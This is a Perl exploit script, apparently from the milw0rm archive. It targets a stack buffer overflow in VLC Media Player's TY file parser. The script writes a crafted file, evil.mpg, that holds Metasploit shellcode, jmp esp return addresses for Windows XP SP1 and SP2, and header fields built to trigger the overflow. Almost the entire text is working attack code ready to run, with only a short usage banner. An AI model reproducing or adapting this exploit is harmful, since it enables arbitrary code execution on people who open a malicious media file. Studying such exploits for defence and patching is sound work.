#!/usr/bin/perl
# 10/21/2008 k`sOSe

use warnings;
use strict;

# windows/exec - 141 bytes
# http://www.metasploit.com
my $shellcode =
"\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01" .
"\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01" .
"\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2" .
"\xeb\xf4\x3b\x54\x24\x04\x75\xe5\x8b\x5f\x24\x01\xeb\x66" .
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89" .
"\x5c\x24\x04\xc3\x5f\x31\xf6\x60\x56\x64\x8b\x46\x30\x8b" .
"\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x89\xf8\x83\xc0\x6a" .
"\x50\x68\xf0\x8a\x04\x5f\x68\x98\xfe\x8a\x0e\x57\xff\xe7" .
"\x43\x3a\x5c\x57\x49\x4e\x44\x4f\x57\x53\x5c\x73\x79\x73" .
"\x74\x65\x6d\x33\x32\x5c\x63\x61\x6c\x63\x2e\x65\x78\x65" .
"\x00";

usage() if(!defined(@ARGV) or scalar(@ARGV) < 1 or $ARGV[0] !~ /^\d$/ or $ARGV[0] > 1);

my @targets = ( 
			"\x24\x11\x62\x77", # jmp esp @ shell32.dll - Win XP SP1 
			"\xb3\x57\x04\x7d"  # jmp esp @ shell32.dll - Win XP SP2
		);

my $junk = "\x41";

open(my $file, "> evil.mpg");
print $file	"\xF5\x46\x7A\xBD" .	# TIVO_PES_FILEID    
		"\x00\x00\x00\x02" .	
		"\x00\x02\x00\x00" . 	# CHUNK_SIZE    
		$junk x 8 .
		"\x00\x00\x05\x41" .	# i_map_size
		$junk x 4 .
		"\x00\x00\x05\x49" .	# SEQ table size / (i_map_size + 8) == 1
		$junk x 60	.
		$targets[$ARGV[0]] .
		$shellcode .
		$junk x 130835	.
		"\x05" .		# i_num_recs
		$junk x 3 .	
		"\x05" .		# p_hdrs
		$junk x 1 .
		"\x09" .		# subrec_type \ 
					#		(subrec type & 0x0f) << 8 | rec_type == 0x9c0 -> AC-3 Audio (DTivo)
		"\xc0" .		# rec_type    /
		$junk x 14 .
		"\x06" .		# subrec_type \
					#            	(subrec type & 0x0f) << 8 | rec_type == 0x6e0 -> Series 1 Tivo
		"\xe0" . 		# rec_type    /
		$junk x 531062;


sub usage
{
	print <<EOM;
VLC Media Player TY File Stack Based Buffer Overflow Exploit
		k`sOSe - 10/21/2008
usage:
	$0 <target>

targets:
	0 - Windows XP SP1
	1 - Windows XP SP2
EOM
exit;
}

# milw0rm.com [2008-10-21]
